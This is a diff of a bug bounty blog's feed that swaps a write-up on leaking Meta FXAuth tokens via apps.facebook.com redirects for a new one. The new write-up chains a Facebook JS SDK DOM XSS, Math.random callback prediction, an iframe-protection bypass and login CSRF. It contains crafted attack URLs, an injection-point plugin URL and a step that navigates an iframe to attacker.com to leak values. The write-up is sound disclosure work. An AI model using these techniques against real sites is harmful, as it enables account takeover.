@@ -1,116 +1,658 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-01-16T10:03:09+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Youssef Sammouda (sam0) personal blog</title><subtitle>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</subtitle><entry><title type="html">Leaking Meta FXAuth Token leading to 2 click Account Takeover</title><link href="http://localhost:4000/uncategorized/2026/01/16/leaking-fxauth-token.html" rel="alternate" type="text/html" title="Leaking Meta FXAuth Token leading to 2 click Account Takeover" /><published>2026-01-16T00:00:00+02:00</published><updated>2026-01-16T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/16/leaking-fxauth-token</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/16/leaking-fxauth-token.html"><![CDATA[<h1 id="introduction">Introduction</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-01-17T15:27:42+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Youssef Sammouda (sam0) personal blog</title><subtitle>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</subtitle><entry><title type="html">Account Takeover in Facebook mobile app due to usage of cryptographically unsecure random number generator and XSS in Facebook JS SDK</title><link href="http://localhost:4000/uncategorized/2026/01/17/math-random-facebook-sdk.html" rel="alternate" type="text/html" title="Account Takeover in Facebook mobile app due to usage of cryptographically unsecure random number generator and XSS in Facebook JS SDK" /><published>2026-01-17T00:00:00+02:00</published><updated>2026-01-17T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/17/math-random-facebook-sdk</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/17/math-random-facebook-sdk.html"><![CDATA[<h1 id="facebook-javascript-sdk-and-facebook-plugins">Facebook Javascript SDK and Facebook plugins</h1>
 <hr />
-<p><br />
-FXAuth is Meta’s shared authentication system used across Facebook, Instagram, and Meta (Horizon / VR). It is used by Accounts Center for account linking, re-authentication, and sensitive action confirmation.</p>
+<p><br /></p>
 
-<p>This write-up documents a redirect flaw in the FXAuth flow that allows the token to be exfiltrated and reused, enabling account linking and takeover in as little as two interactions.</p>
+<p>Meta provides several embeddable plugins such as the <code class="language-plaintext highlighter-rouge">Like</code> button, <code class="language-plaintext highlighter-rouge">Customer Chat</code> plugin, and <code class="language-plaintext highlighter-rouge">Feedback</code> plugin. These plugins are hosted under <code class="language-plaintext highlighter-rouge">www.facebook.com</code> and are designed to be embedded into third-party websites using iframe elements.</p>
 
-<h1 id="description">Description</h1>
-<hr />
-<h3 id="the-fxauth-redirect-model">The FXAuth Redirect Model</h3>
+<p>The typical integration flow works as follows:</p>
 
-<p>The FXAuth flow endpoint for <code class="language-plaintext highlighter-rouge">meta.com</code> is:</p>
+<ol>
+  <li>A website includes the <code class="language-plaintext highlighter-rouge">Facebook JavaScript SDK</code>.</li>
+  <li>The site calls SDK functions such as <code class="language-plaintext highlighter-rouge">FB.init()</code> and <code class="language-plaintext highlighter-rouge">FB.ui()</code>.</li>
+  <li>The SDK dynamically creates an iframe pointing to a plugin endpoint, for example the <code class="language-plaintext highlighter-rouge">https://www.facebook.com/plugins/customerchat.php</code> plugin</li>
+  <li>The iframe is initialized with url parameters that include:
+    <ul>
+      <li>The host website origin</li>
+      <li>A callback identifier which was randomly generated</li>
+    </ul>
+  </li>
+</ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://auth.meta.com/fxauth/
-</code></pre></div></div>
+<p>Communication between the host website and the plugin iframe is implemented using <code class="language-plaintext highlighter-rouge">postMessage</code>.<br />
+The plugin sends messages to its parent window, and the SDK on the host side listens for those messages and dispatches them internally.</p>
 
-<p>This endpoint asks for user approval and redirects the browser back to the requestor website ( facebook.com/ instagram.com) with siged <code class="language-plaintext highlighter-rouge">token</code> and <code class="language-plaintext highlighter-rouge">blob</code>. It accepts multiple parameters, including <code class="language-plaintext highlighter-rouge">base_uri</code>:</p>
-
-<p>Originally, <code class="language-plaintext highlighter-rouge">base_uri</code> accepted any arbitrary domain, making token exfiltration trivial. Meta fixed this by restricting the parameter to Meta-owned domains.</p>
-
-<p>However, the fix relied on an incorrect assumption: that restricting the domain alone is sufficient if the attacker cannot directly control the redirect path.</p>
-
-<h3 id="why-the-fix-was-insufficient">Why the Fix Was Insufficient</h3>
-
-<p>While <code class="language-plaintext highlighter-rouge">base_uri</code> was restricted to Meta domains, not all Meta domains are safe.</p>
-
-<p>Legacy surfaces still exist where attackers can execute JavaScript under controlled paths. One such surface is <code class="language-plaintext highlighter-rouge">apps.facebook.com</code>.</p>
-
-<p>Developers can register applications with a namespace that becomes part of the URL:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://apps.facebook.com/{app_namespace}
-</code></pre></div></div>
-
-<p>If the attacker owns an application (notably older ones), they regain the ability to read parameters from the URL despite not controlling the base path directly.</p>
-
-<p>This effectively reintroduces the original vulnerability under a different trust boundary.</p>
-
-<h3 id="the-exploitable-fxauth-flow">The Exploitable FXAuth Flow</h3>
-
-<p>A valid FXAuth request accepts:</p>
-
+<p>To prevent arbitrary message injection, the SDK enforces two checks on received messages:</p>
 <ul>
-  <li><code class="language-plaintext highlighter-rouge">app_id</code> belonging to Facebook or Instagram</li>
-  <li><code class="language-plaintext highlighter-rouge">flow</code> such as <code class="language-plaintext highlighter-rouge">frlcomet</code> or <code class="language-plaintext highlighter-rouge">frlreauth</code></li>
-  <li><code class="language-plaintext highlighter-rouge">etoken</code> generated earlier in an Accounts Center flow</li>
-  <li><code class="language-plaintext highlighter-rouge">next</code> restricted to internal paths</li>
-  <li><code class="language-plaintext highlighter-rouge">base_uri</code> restricted to Meta-owned domains</li>
+  <li>The message must originate from <code class="language-plaintext highlighter-rouge">www.facebook.com</code> (where the plugins are hosted)</li>
+  <li>The message must include the correct callback identifier (random string)</li>
 </ul>
 
-<p>Example:</p>
+<p>Only messages that satisfy both conditions are accepted and processed by the SDK.</p>
 
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://auth.meta.com/fxauth/
-?app_id=2220391788200892
-<span class="err">&amp;</span>etoken=ATTACKER_ETOKEN
-<span class="err">&amp;</span>next=%2Fpersonal_info
-<span class="err">&amp;</span>flow=frlcomet
-<span class="err">&amp;</span>base_uri=https://apps.facebook.com
+<h1 id="xss-in-javascript-sdk-customer-chat-plugin">XSS in JavaScript SDK Customer Chat Plugin</h1>
+<hr />
+<p><br />
+While reviewing the Facebook JavaScript SDK, I noticed that the SDK registers a cross-window message listener for messages coming from the Customer Chat plugin iframe.</p>
+
+<p>The relevant code sets up a message handler that forwards incoming messages to an internal event system <code class="language-plaintext highlighter-rouge">g.inform("xd." + a.type, a);</code>, which sends an event named <code class="language-plaintext highlighter-rouge">xd.&lt;type&gt;</code> with <code class="language-plaintext highlighter-rouge">&lt;type&gt;</code> form the incoming message.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">ES</span><span class="p">(</span><span class="dl">"</span><span class="s2">Object</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">assign</span><span class="dl">"</span><span class="p">,</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span> <span class="nx">j</span><span class="p">,</span> <span class="p">{</span>
+                      <span class="na">app_id</span><span class="p">:</span> <span class="nf">c</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.Runtime</span><span class="dl">"</span><span class="p">).</span><span class="nf">getClientID</span><span class="p">(),</span>
+                      <span class="na">locale</span><span class="p">:</span> <span class="nf">c</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.Runtime</span><span class="dl">"</span><span class="p">).</span><span class="nf">getLocale</span><span class="p">(),</span>
+                      <span class="na">sdk</span><span class="p">:</span> <span class="dl">"</span><span class="s2">joey</span><span class="dl">"</span><span class="p">,</span>
+                      <span class="na">kid_directed_site</span><span class="p">:</span> <span class="nf">c</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.Runtime</span><span class="dl">"</span><span class="p">).</span><span class="nf">getKidDirectedSite</span><span class="p">(),</span>
+                      <span class="na">channel</span><span class="p">:</span> <span class="nf">d</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.XD</span><span class="dl">"</span><span class="p">).</span><span class="nf">handler</span><span class="p">(</span>
+                        <span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+                          <span class="nx">a</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="nx">g</span><span class="p">.</span><span class="nf">inform</span><span class="p">(</span><span class="dl">"</span><span class="s2">xd.</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">a</span><span class="p">.</span><span class="nx">type</span><span class="p">,</span> <span class="nx">a</span><span class="p">);</span>
+                        <span class="p">},</span>
+                        <span class="dl">"</span><span class="s2">parent.parent</span><span class="dl">"</span><span class="p">,</span>
+                        <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
+                      <span class="p">),</span>
+                    <span class="p">});</span>
 </code></pre></div></div>
 
-<p>The <code class="language-plaintext highlighter-rouge">etoken</code> can be obtained by initiating a standard Accounts Center linking flow:</p>
+<p>This SDK setup handler/subscriber functions for these events. One such handler is registered as follows:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.facebook.com/add/?auth_flow=frl_linking&amp;background_page=%2F
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">this</span><span class="p">.</span><span class="nf">subscribe</span><span class="p">(</span><span class="dl">"</span><span class="s2">xd.mpn.setupIconIframe</span><span class="dl">"</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">a</span><span class="p">.</span><span class="nc">$CustomerChat20</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>
+                  <span class="p">});</span>
 </code></pre></div></div>
 
-<h3 id="token-exfiltration">Token Exfiltration</h3>
+<p>When the event <code class="language-plaintext highlighter-rouge">xd.mpn.setupIconIframe</code> is received, the function <code class="language-plaintext highlighter-rouge">$CustomerChat20</code> is invoked with attacker-controlled data.</p>
 
-<p>When the victim opens the crafted FXAuth URL and approves the request, the browser is redirected to:</p>
+<p>Inside this function, the SDK extracts an <code class="language-plaintext highlighter-rouge">iconSVG</code> field from the message and injects it directly into the DOM:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://apps.facebook.com/personal_info
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nx">e</span><span class="p">.</span><span class="nx">$CustomerChat20</span> <span class="o">=</span> <span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+                  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
+                  <span class="k">this</span><span class="p">.</span><span class="nx">$CustomerChat1</span> <span class="o">&amp;&amp;</span>
+                    <span class="nf">d</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.DOM</span><span class="dl">"</span><span class="p">).</span><span class="nf">remove</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">$CustomerChat1</span><span class="p">);</span>
+                  <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">frameName</span><span class="p">,</span>
+                    <span class="nx">f</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">iconSVG</span><span class="p">,</span>
+                    <span class="nx">g</span> <span class="o">=</span> <span class="nf">d</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.DialogUtils</span><span class="dl">"</span><span class="p">).</span><span class="nf">setupNewDialog</span><span class="p">(),</span>
+                    <span class="nx">h</span> <span class="o">=</span> <span class="nc">ES</span><span class="p">(</span><span class="dl">"</span><span class="s2">JSON</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">parse</span><span class="dl">"</span><span class="p">,</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">cssText</span><span class="p">),</span>
+                    <span class="nx">i</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
+                  <span class="nx">f</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nf">d</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.DOM</span><span class="dl">"</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">f</span><span class="p">),</span>
+
 </code></pre></div></div>
 
-<p>The redirect includes sensitive parameters such as <code class="language-plaintext highlighter-rouge">blob</code> and <code class="language-plaintext highlighter-rouge">token</code>.</p>
+<p>Because <code class="language-plaintext highlighter-rouge">iconSVG</code> is injected without sanitization, this results in a DOM-based cross-site scripting vulnerability on the host website.</p>
 
-<p>Because the attacker controls execution within their application namespace <code class="language-plaintext highlighter-rouge">personal_info</code>, both values can be trivially extracted. At this point, the attacker holds a valid FXAuth token bound to the victim account, he can finalize privileged flows without further user confirmation:</p>
+<p>At this stage, exploitation appears impossible due to two constraints:</p>
 
-<p>Account linking:</p>
+<ul>
+  <li>Messages must originate from <code class="language-plaintext highlighter-rouge">www.facebook.com</code></li>
+  <li>The attacker must know the random callback string</li>
+</ul>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.facebook.com/add/
-?auth_flow=frl_linking
-&amp;background_page=%2F
-&amp;blob=BLOB
-&amp;token=TOKEN
+<h3 id="i---sending-messages-from-wwwfacebookcom">I - Sending messages from www.facebook.com</h3>
+<hr />
+<p><br />
+To satisfy the message origin requirement, I identified the following endpoint:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/plugins/feedback.php?
+<span class="err">&amp;</span>api_key
+<span class="err">&amp;</span>channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23
+    %26relation=parent.parent.frames[0]
+    %26cb=${encodeURIComponent(INJECTION_POINT)}
+    %26origin=${target}
+<span class="err">&amp;</span>href=https%3A%2F%2Fwww.facebook.com%2F
+<span class="err">&amp;</span>locale=en_US
+<span class="err">&amp;</span>numposts=10
+<span class="err">&amp;</span>order_by=time
+<span class="err">&amp;</span>sdk=joey<span class="err">&amp;</span>version=v2.3
+<span class="err">&amp;</span>width=600
+<span class="err">&amp;</span>_rdr`
 </code></pre></div></div>
 
-<p>Action re-authentication bypass:</p>
+<p>When loaded, this plugin sends a message from a Facebook origin to the embedding website that loaded the SDK with <code class="language-plaintext highlighter-rouge">INJECTION_POINT</code> in the message without any sanitization, meaning that it’s possible to <code class="language-plaintext highlighter-rouge">&amp;</code> andd more text.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.facebook.com/profiles/VICTIM_PROFILE_ID/name/
-?auth_flow=reauth
-&amp;blob=BLOB
-&amp;token=TOKEN
+<h3 id="ii---random-string-generation">II - Random String Generation</h3>
+<hr />
+<p><br />
+To validate incoming postMessage events, the Facebook JavaScript SDK relies on a callback identifier generated at runtime. This identifier is treated as a shared secret between the host page and the embedded plugin iframe, and is required for message acceptance.</p>
+
+<p>Tracing the generation of this identifier reveals that it is produced by the following helper module:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+ <span class="nf">__d</span><span class="p">(</span>
+            <span class="dl">"</span><span class="s2">guid</span><span class="dl">"</span><span class="p">,</span>
+            <span class="p">[],</span>
+            <span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">d</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
+              <span class="kd">function</span> <span class="nf">a</span><span class="p">()</span> <span class="p">{</span>
+                <span class="k">return </span><span class="p">(</span>
+                  <span class="dl">"</span><span class="s2">f</span><span class="dl">"</span> <span class="o">+</span>
+                  <span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">30</span><span class="p">)).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">.</span><span class="dl">"</span><span class="p">,</span> <span class="dl">""</span><span class="p">)</span>
+                <span class="p">);</span>
+              <span class="p">}</span>
+              <span class="nx">f</span><span class="p">[</span><span class="dl">"</span><span class="s2">default</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="nx">a</span><span class="p">;</span>
+            <span class="p">},</span>
+            <span class="mi">66</span><span class="p">,</span>
+          <span class="p">);</span>
+
 </code></pre></div></div>
 
-<p>These flows normally require explicit confirmation. Possession of a valid FXAuth token bypasses that requirement entirely.</p>
+<p>The callback value is therefore derived directly from <code class="language-plaintext highlighter-rouge">Math.random()</code>, a non‑cryptographic pseudo‑random number generator.</p>
+
+<p>This introduces a critical trust boundary violation: a value that is used as an <em>authentication primitive</em> for cross‑origin messaging is generated using a mechanism that provides no unpredictability guarantees against an active attacker.</p>
+
+<h4 id="1-why-mathrandom-is-inappropriate-in-this-context">1) Why Math.random Is Inappropriate in This Context</h4>
+
+<p><code class="language-plaintext highlighter-rouge">Math.random()</code> is implemented as a deterministic PRNG whose internal state evolves predictably. While sufficient for non‑security use cases (UI randomness, sampling, etc.), it is explicitly unsuitable for any scenario where unpredictability is relied upon for security decisions.</p>
+
+<p>In this case, the callback identifier functions as:</p>
+<ul>
+  <li>A message authentication token</li>
+  <li>A gatekeeper for privileged SDK message handlers</li>
+  <li>The sole barrier preventing arbitrary message injection</li>
+</ul>
+
+<p>Once an attacker can observe a sequence of outputs from the same PRNG instance, the internal state can be inferred. This allows the attacker to:</p>
+<ul>
+  <li>Predict future outputs</li>
+  <li>Reconstruct recently generated past values</li>
+  <li>Forge valid callback identifiers without guessing</li>
+</ul>
+
+<p>The security of the entire message validation mechanism therefore collapses if PRNG outputs can be observed.</p>
+
+<h4 id="2-observing-prng-outputs-via-plugin-iframe">2) Observing PRNG outputs via Plugin iframe</h4>
+<p>Further analysis of SDK internals shows that the same <code class="language-plaintext highlighter-rouge">guid()</code> function is reused when creating plugin iframes. Specifically, if an explicit iframe name is not provided, the SDK generates one automatically:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+ <span class="nf">__d</span><span class="p">(</span>
+            <span class="dl">"</span><span class="s2">sdk.createIframe</span><span class="dl">"</span><span class="p">,</span>
+            <span class="p">[</span><span class="dl">"</span><span class="s2">DOMEventListener</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">getBlankIframeSrc</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">guid</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">isNumberLike</span><span class="dl">"</span><span class="p">],</span>
+            <span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">d</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">f</span><span class="p">,</span> <span class="nx">g</span><span class="p">)</span> <span class="p">{</span>
+              <span class="kd">function</span> <span class="nf">a</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+                <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nc">ES</span><span class="p">(</span><span class="dl">"</span><span class="s2">Object</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">assign</span><span class="dl">"</span><span class="p">,</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span> <span class="p">{},</span> <span class="nx">a</span><span class="p">),</span>
+                  <span class="nx">e</span><span class="p">,</span>
+                  <span class="nx">f</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">name</span> <span class="o">||</span> <span class="nf">c</span><span class="p">(</span><span class="dl">"</span><span class="s2">guid</span><span class="dl">"</span><span class="p">)(),</span>
+
+</code></pre></div></div>
+
+<p>This value becomes the <code class="language-plaintext highlighter-rouge">window.name</code> of the newly created iframe.</p>
+
+<p>Because iframe names are part of the browsing context and persist across navigations, this creates an unintended side channel: any party that can later obtain same‑origin access to the iframe window can read the name and recover a raw <code class="language-plaintext highlighter-rouge">Math.random()</code> output.</p>
+
+<p>This means that plugin iframe creation leaks PRNG outputs that originate from the same generator instance responsible for producing message callback identifiers. However, in practice, most websites embed only a single Facebook plugin per page. This initially appears to limit exploitation, as reconstructing PRNG state typically requires observing multiple sequential outputs.</p>
+
+<p>However, the SDK exposes additional behavior that allows forced regeneration of plugin iframes without requiring a full page reload.</p>
+
+<h4 id="3-forcing-reinitialization-via-initpost">3) Forcing reinitialization via init:post</h4>
+<hr />
+<p><br />
+The SDK registers other listeners beside <code class="language-plaintext highlighter-rouge">xd.&lt;type&gt;</code> ones targeting plugins, one of them is the <code class="language-plaintext highlighter-rouge">init:post</code> event:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nx">sdk</span><span class="p">.</span><span class="nx">Event</span><span class="p">.</span><span class="nf">subscribe</span><span class="p">(</span><span class="dl">"</span><span class="s2">init:post</span><span class="dl">"</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if </span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">xfbml</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">XFBML</span><span class="p">.</span><span class="nf">parse</span><span class="p">();</span>
+  <span class="p">}</span>
+<span class="p">});</span>
+
+</code></pre></div></div>
+
+<p>When a message containing <code class="language-plaintext highlighter-rouge">xfbml: true</code> is received, the SDK re‑parses the page and re‑initializes all XFBML plugins. From the SDK’s perspective, this is equivalent to the initial page load.</p>
+
+<p>Each reinitialization:</p>
+<ul>
+  <li>Destroys the existing plugin iframe</li>
+  <li>Creates a new iframe</li>
+  <li>Generates a new iframe name via <code class="language-plaintext highlighter-rouge">guid()</code></li>
+  <li>Advances the PRNG state</li>
+</ul>
+
+<p>By repeatedly triggering this event, an attacker can force the SDK to emit an arbitrary number of PRNG outputs.</p>
+
+<h4 id="4-extracting-iframe-window-names">4) Extracting iframe window names</h4>
+
+<p>To read the generated iframe names, the attacker must control the top‑level browsing context.</p>
+
+<p>The attack layout is as follows:</p>
+
+<ul>
+  <li>The attacker embeds the victim website in an iframe</li>
+  <li>The victim website embeds the Facebook plugin iframe</li>
+  <li>The attacker navigates the plugin iframe to an attacker‑controlled origin via <code class="language-plaintext highlighter-rouge">window.frames[0].frames[0] = "https://attacker.com"</code></li>
+  <li>Same‑origin access is restored</li>
+  <li>The attacker reads the iframe name via <code class="language-plaintext highlighter-rouge">window.frames[0].frames[0].name</code></li>
+</ul>
+
+<p>This technique requires the victim website to allow framing, either due to missing <code class="language-plaintext highlighter-rouge">X-Frame-Options</code> or a permissive <code class="language-plaintext highlighter-rouge">frame-ancestors</code> CSP directive.</p>
+
+<h4 id="5-attack-attempt-1">5) Attack Attempt #1</h4>
+
+<ul>
+  <li>Attacker embeds victim website in an iframe</li>
+  <li>Victim website embeds Facebook Customer Chat plugin via Facebook SDK</li>
+  <li>Attacker leaks plugin iframe window name</li>
+  <li>Attacker forces plugin reinitialization</li>
+  <li>Attacker repeats above 2 steps multiple times</li>
+  <li>Attacker reconstructs Math.random state</li>
+  <li>Attacker calculates callback string</li>
+  <li>Attacker sends crafted message from <code class="language-plaintext highlighter-rouge">www.facebook.com</code> origin</li>
+  <li>DOM XSS is triggered on the victim website</li>
+</ul>
+
+<p>While the exploit chain is technically complete, the immediate impact is constrained by deployment realities:</p>
+
+<ul>
+  <li>The XSS occurs on the embedding website, not on www.facebook.com</li>
+  <li>Exploitation depends on framing being allowed</li>
+  <li>Many high‑value sites enforce strict framing policies</li>
+</ul>
+
+<p>As a result, exploitation against arbitrary third‑party websites would likely be assessed as low to medium impact. This motivated a shift in focus toward identifying Facebook‑owned surfaces that:</p>
+<ul>
+  <li>Embed the affected plugin</li>
+  <li>Allow framing or equivalent access</li>
+  <li>Elevate the impact to a first‑party security issue</li>
+</ul>
+
+<h3 id="iii---iframe-protection-bypass-in-wwwfacebookcom">III - Iframe protection bypass in www.facebook.com</h3>
+<hr />
+<p><br />
+Finding a particular page with a misconfigured <code class="language-plaintext highlighter-rouge">XFO</code> or <code class="language-plaintext highlighter-rouge">frame-ancestors</code> won’t cut it since we have another condition later to find a Facebook page with the customer plugin embedded.
+Realistically, it would be unlikely to find a single page with the two conditions met, so i focused on finding a more general issue that would affect the entire website, likely it was possible to find one:</p>
+
+<p>While playing around in Facebook mobile application in iOS/Android, i noticed that in some requests the XFO header would be like this:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">X-Frame-Options: SAMEORIGIN</code></li>
+</ul>
+
+<p>Although this is totally normal, i probably never saw it before used in WEB. This made me suspicious, so i tried to load a page that has <code class="language-plaintext highlighter-rouge">frame-ancestors</code> set to any domain. As a result the returned XFO was found to be set :</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">X-Frame-Options: ALLOW-FROM domain</code></li>
+</ul>
+
+<p>This is perfect! it means that there’s actually no frame protection at all, since <code class="language-plaintext highlighter-rouge">ALLOW-FROM</code> is not supported anymore in modern browsers.</p>
+
+<p>Okay so now we have a trick that we can use to disable frame protection, however this trick would only work if a page in normal conditions in web would return <code class="language-plaintext highlighter-rouge">frame-ancestors</code> and allow at least one domain. Unfortunately, this added another condition to already 2 previous conditions so we needed to find a bypass for this.</p>
+
+<h3 id="iv---forcing-frame-ancestors-embed-in-wwwfacebookcom-pages">IV - Forcing frame-ancestors embed in www.facebook.com pages</h3>
+<hr />
+
+<p>As we said now we need a way to make any page return <code class="language-plaintext highlighter-rouge">frame-ancestors: anydomain</code> so the bug above triggers.
+It was found that Facebook has this feature, it’s called <code class="language-plaintext highlighter-rouge">Compat</code> and it allows other subdomains to include/iframe a page in other subdomains. If any page was appended the parameter:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&amp;</span>cquick=1
+<span class="err">&amp;</span>cquick_token=TOKEN
+<span class="err">&amp;</span>ctarget=https://www.facebook.com
+</code></pre></div></div>
+
+<p>It will return <code class="language-plaintext highlighter-rouge">frame-ancestors: https://www.facebook.com</code> and trigger the previous bug ( of course in a mobile env inside Facebook app webview).</p>
+
+<p>However, you probably noticed the <code class="language-plaintext highlighter-rouge">TOKEN</code>, which immediately raises red flags. It turns out this token is tied to the currently authenticated user, meaning it’s impossible to trigger the compatibility behavior in a victim’s session without knowing their token.</p>
+
+<p>At this point, I had the idea of attempting a classic <code class="language-plaintext highlighter-rouge">login CSRF</code> into my own account. Naturally, this would only lead to XSSing myself, so an additional constraint was needed: we must keep a valid Facebook page open inside an iframe. This page needs to contain something of value in its body, and crucially it must not refresh when it detects a session change.</p>
+
+<h3 id="v---facebook-page-with-customer-chat-plugin-loaded">V - Facebook page with customer chat plugin loaded</h3>
+
+<p>It was dicovered that the page <code class="language-plaintext highlighter-rouge">https://www.facebook.com/business/goals/add-live-chat-to-website-with-messenger</code> had Facebook SDK and loaded the customer chat plugin as a demonstration for the plugin.</p>
+
+<h3 id="vi---predicting-mathrandom-seed">VI - Predicting Math.random() seed</h3>
+
+<p>To avoid making this write-up any longer than it already is, I highly recommend watching PwnFunction’s excellent <a href="&quot;https://www.youtube.com/watch?v=-h_rj2-HP2E">video</a> on this topic. You should also check out his <a href="&quot;https://github.com/PwnFunction/v8-randomness-predictor/blob/main/main.py&quot;">Github repository</a> and the accompanying resources.</p>
+
+<p>My attack did not introduce anything fundamentally new; the only required change was a slight modification to the solver so it would still work even when the supplied seeds were not consecutive. Because the iframe reinitialization trick resets everything, each iframe window name we obtain is actually two steps behind the previous one:</p>
+
+<p>1) Math.random() value for <code class="language-plaintext highlighter-rouge">window.name</code></p>
+
+<p>2) Math.random() value for <code class="language-plaintext highlighter-rouge">callback function</code> &lt;—— Z3 needs to skip this</p>
+
+<p>3) Math.random() value for <code class="language-plaintext highlighter-rouge">iframe id</code> &lt;—— Z3 needs to skip this</p>
+
+<h2 id="final-attack">Final Attack</h2>
+<hr />
+<p><br /></p>
+
+<p>1) Victim vists attacker’s website in Facbook App</p>
+
+<p>2) Attacker website opens in Facebook App Webview</p>
+
+<p>3) Attacker creates an iframe <code class="language-plaintext highlighter-rouge">[ name:MAIN ]</code>, and load a Facebook page which would contain a sensitive value like OAuth code/token ( xd_arbiter page or /dialog/oauth + ajaxpipe/__a parameters to avoid reloads)</p>
+
